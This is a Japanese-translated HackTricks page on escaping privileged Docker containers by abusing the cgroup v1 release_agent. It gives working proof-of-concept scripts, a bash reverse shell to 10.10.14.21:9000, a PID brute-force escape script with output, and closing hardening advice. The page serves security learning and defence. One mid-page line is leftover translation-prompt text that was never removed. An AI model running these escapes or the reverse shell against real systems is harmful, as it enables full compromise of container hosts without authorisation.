<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを**共有する**。

</details>


# `--privileged` フラグ

{% code title="Initial PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o;
echo $t/c >$d/release_agent;
echo "#!/bin/sh $1 >$t/o" >/c;
chmod +x /c;
sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
{% endcode %}

{% code title="第二のPoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/10.10.14.21/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```
{% endcode %}

`--privileged`フラグは重大なセキュリティ上の懸念を引き起こし、このエクスプロイトはそれが有効になっているDockerコンテナを起動することに依存しています。このフラグを使用すると、コンテナはすべてのデバイスへの完全なアクセス権を持ち、seccomp、AppArmor、Linuxの機能からの制限がありません。

実際、`--privileged`はこの方法でDockerコンテナから脱出するために必要な権限よりもはるかに多くの権限を提供します。現実には、「ただ」以下の要件があります：

1. コンテナ内でrootとして実行されている必要があります
2. コンテナは`SYS_ADMIN` Linux機能で実行されている必要があります
3. コンテナはAppArmorプロファイルを持たないか、または`mount`システムコールを許可する必要があります
4. コンテナ内でcgroup v1仮想ファイルシステムが読み書き可能でマウントされている必要があります

`SYS_ADMIN`機能はコンテナがマウントシステムコールを実行することを可能にします（[man 7 capabilities](https://linux.die.net/man/7/capabilities)を参照）。[Dockerはデフォルトで制限された機能セットでコンテナを起動します](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities)し、セキュリティリスクのため`SYS_ADMIN`機能を有効にしません。

さらに、Dockerはデフォルトで[`docker-default` AppArmorポリシーでコンテナを起動します](https://docs.docker.com/engine/security/apparmor/#understand-the-policies)。これは、[`SYS_ADMIN`でコンテナを実行してもマウントシステムコールの使用を防ぎます](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35)。

コンテナは、`--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`フラグで実行された場合、このテクニックに対して脆弱になります。

## コンセプト実証の分解

このテクニックを使用するための要件を理解し、コンセプト実証エクスプロイトを洗練させたので、それを行ごとに歩いていき、どのように機能するかを示しましょう。

このエクスプロイトをトリガーするには、`release_agent`ファイルを作成し、cgroup内のすべてのプロセスを終了させることによって`release_agent`の呼び出しをトリガーできるcgroupが必要です。それを達成する最も簡単な方法は、cgroupコントローラをマウントし、子cgroupを作成することです。

それを行うために、`/tmp/cgrp`ディレクトリを作成し、[RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroupコントローラをマウントし、子cgroup（この例では「x」と名付けられています）を作成します。すべてのcgroupコントローラがテストされたわけではありませんが、このテクニックは大多数のcgroupコントローラで機能するはずです。

もし「mount: /tmp/cgrp: special device cgroup does not exist」というメッセージが出た場合、それはあなたのセットアップにRDMA cgroupコントローラがないためです。`rdma`を`memory`に変更することで修正できます。RDMAを使用しているのは、元のPoCがそれでのみ機能するように設計されていたからです。

cgroupコントローラはグローバルリソースであり、異なる権限で複数回マウントすることができ、一つのマウントで行われた変更は別のマウントに適用されることに注意してください。

以下に「x」子cgroupの作成とそのディレクトリリストを示します。
```text
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
次に、「x」cgroupのリリース時にcgroup通知を有効にするために、その`notify_on_release`ファイルに1を書き込みます。また、RDMA cgroupリリースエージェントがコンテナ内で後で作成する`/cmd`スクリプトを実行するように設定します。これを行うには、ホスト上の`release_agent`ファイルに`/cmd`スクリプトのパスを書き込みます。これを行うために、`/etc/mtab`ファイルからコンテナのホスト上のパスを取得します。

コンテナで追加または変更したファイルはホスト上に存在し、コンテナのパスとホスト上のパスの両方から変更することが可能です。

以下にその操作を示します：
```text
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
ホスト上で作成する予定の `/cmd` スクリプトへのパスに注意してください：
```text
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
```markdown
これで、`ps aux` コマンドを実行し、その出力をホスト上の出力ファイルの完全なパスを指定してコンテナの `/output` に保存するように `/cmd` スクリプトを作成します。最後に、`/cmd` スクリプトの内容を表示して確認します：
```
```text
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
最終的に、"x" 子 cgroup 内で直ちに終了するプロセスを生成することで攻撃を実行できます。`/bin/sh` プロセスを作成し、その PID を "x" 子 cgroup ディレクトリの `cgroup.procs` ファイルに書き込むと、`/bin/sh` が終了した後にホスト上のスクリプトが実行されます。ホスト上で実行された `ps aux` の出力は、コンテナ内の `/output` ファイルに保存されます：
```text
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
# `--privileged` フラグ v2

以前のPoCは、例えば `overlayfs` のように、マウントポイントのホストパス全体を公開するストレージドライバーでコンテナが設定されている場合にはうまく機能しますが、最近、ホストファイルシステムのマウントポイントを明らかにしていないいくつかの設定に遭遇しました。

## Kata Containers
```text
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
[Kata Containers](https://katacontainers.io/)はデフォルトでコンテナのルートファイルシステムを`9pfs`を介してマウントします。これはKata Containersの仮想マシン内のコンテナファイルシステムの位置に関する情報を漏らしません。

\* Kata Containersについては、将来のブログ投稿で詳しく説明します。

## デバイスマッパー
```text
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
## 代替のPoC

明らかに、これらのケースではホストファイルシステム上のコンテナファイルのパスを特定するのに十分な情報がないため、FelixのPoCはそのままでは使用できません。しかし、少しの工夫をこらすことで、この攻撃を実行することは可能です。

必要な鍵となる情報は、コンテナホストに対して相対的な、コンテナ内で実行するファイルの完全なパスです。コンテナ内のマウントポイントからこれを判別することができない場合、他の方法を探る必要があります。

### Procが救世主に <a id="proc-to-the-rescue"></a>

Linuxの`/proc`擬似ファイルシステムは、システム上で実行されているすべてのプロセスのカーネルプロセスデータ構造を公開しています。これには、例えばコンテナ内で実行されている異なる名前空間のプロセスも含まれます。これは、コンテナでコマンドを実行し、ホスト上のプロセスの`/proc`ディレクトリにアクセスすることで示されます：Container
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
以下は、Dockerコンテナからの脱出に関するLinux/Unixの権限昇格についてのハッキング技術に関するハッキング書籍の内容です。関連する英語テキストを日本語に翻訳し、まったく同じマークダウンおよびHTML構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグのようなものは翻訳しないでください。また、翻訳とマークダウン構文以外の余分なものは何も追加しないでください。

_余談ですが、`/proc/<pid>/root` データ構造は、私が非常に長い間混乱していたもので、`/` へのシンボリックリンクがどうして役立つのか理解できませんでした。それは、manページで実際の定義を読むまでのことでした。_

> /proc/\[pid\]/root
>
> UNIXおよびLinuxは、chroot\(2\)システムコールによって設定される、プロセスごとのファイルシステムのルートという考えをサポートしています。このファイルは、プロセスのルートディレクトリを指すシンボリックリンクであり、exeやfd/\*と同じように動作します。
>
> ただし、このファイルは単なるシンボリックリンクではありません。プロセス自体と同じファイルシステムのビュー（名前空間やプロセスごとのマウントセットを含む）を提供します。

`/proc/<pid>/root` シンボリックリンクは、コンテナ内の任意のファイルへのホスト相対パスとして使用できます：Container
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
この変更により、攻撃に必要なのは、コンテナ内のファイルの完全なパスをコンテナホストに対して知ることから、コンテナ内で実行されている_任意の_プロセスのpidを知ることに変わります。

### Pid Bashing <a id="pid-bashing"></a>

これは実際には簡単な部分です。LinuxではプロセスIDは数値であり、順番に割り当てられます。`init`プロセスにはプロセスID `1` が割り当てられ、その後のすべてのプロセスにはインクリメンタルなIDが割り当てられます。コンテナ内のプロセスのホストプロセスIDを特定するには、ブルートフォースのインクリメンタル検索を使用できます：Container
```text
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
ホスト
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
### すべてをまとめる <a id="putting-it-all-together"></a>

この攻撃を完了するために、`/proc/<pid>/root/payload.sh` のパスの pid を推測するためにブルートフォース技術が使用されます。各イテレーションで、推測された pid パスを cgroups の `release_agent` ファイルに書き込み、`release_agent` をトリガーし、出力ファイルが作成されるかどうかを確認します。

この技術の唯一の注意点は、それが微妙ではなく、pid のカウントを非常に高くする可能性があることです。長時間実行されるプロセスは実行されないため、これは信頼性の問題を引き起こすべきではありませんが、その点については私の言葉を引用しないでください。

以下の PoC は、cgroups の `release_agent` 機能を使用して特権コンテナから脱出するために、フェリックスの元の PoC で最初に提示されたものよりも一般的な攻撃を提供するためにこれらの技術を実装しています：
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
プリビレッジドコンテナ内でPoCを実行すると、以下のような出力が得られるはずです：
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# コンテナを安全に使用する

Dockerはデフォルトでコンテナを制限し、隔離します。これらの制限を緩めることは、`--privileged`フラグの完全な権限なしでも、セキュリティ上の問題を引き起こす可能性があります。追加する各権限の影響を認識し、必要最小限に権限を制限することが重要です。

コンテナを安全に保つために:

* `--privileged`フラグを使用しないでください。また、[Dockerソケットをコンテナ内にマウント](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/)しないでください。Dockerソケットはコンテナの生成を可能にするため、例えば`--privileged`フラグを使用して別のコンテナを実行することで、ホストを完全に制御する簡単な方法です。
* コンテナ内でrootとして実行しないでください。[異なるユーザー](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user)を使用するか、[ユーザーネームスペース](https://docs.docker.com/engine/security/userns-remap/)を使用してください。ユーザーネームスペースでリマップしない限り、コンテナのrootはホスト上のrootと同じです。主にLinuxのネームスペース、機能、およびcgroupsによって軽く制限されています。
* [すべての機能を削除](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities)します(`--cap-drop=all`) そして、必要なものだけを有効にします(`--cap-add=...`)。多くのワークロードはいかなる機能も必要とせず、それらを追加することは潜在的な攻撃の範囲を広げます。
* suidバイナリを通じてたとえば、プロセスがより多くの権限を得るのを防ぐために、[“no-new-privileges”セキュリティオプションを使用](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/)してください。
* [コンテナに利用可能なリソースを制限](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources)します。リソース制限は、サービス拒否攻撃からマシンを保護することができます。
* コンテナに必要な最小限のアクションとシステムコールに制限するために、[seccomp](https://docs.docker.com/engine/security/seccomp/)、[AppArmor](https://docs.docker.com/engine/security/apparmor/)（またはSELinux）プロファイルを調整します。
* [公式のdockerイメージ](https://docs.docker.com/docker-hub/official_images/)を使用するか、それらに基づいて自分のイメージを構築してください。[バックドア](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/)が仕掛けられたイメージを継承したり使用したりしないでください。
* 定期的にイメージを再構築してセキュリティパッチを適用してください。これは言うまでもありません。

# 参考文献

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://twitter.com/\_fel1x/status/1151487051986087936](https://twitter.com/_fel1x/status/1151487051986087936)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)



<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksに広告を掲載したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションです。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加するか**、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>
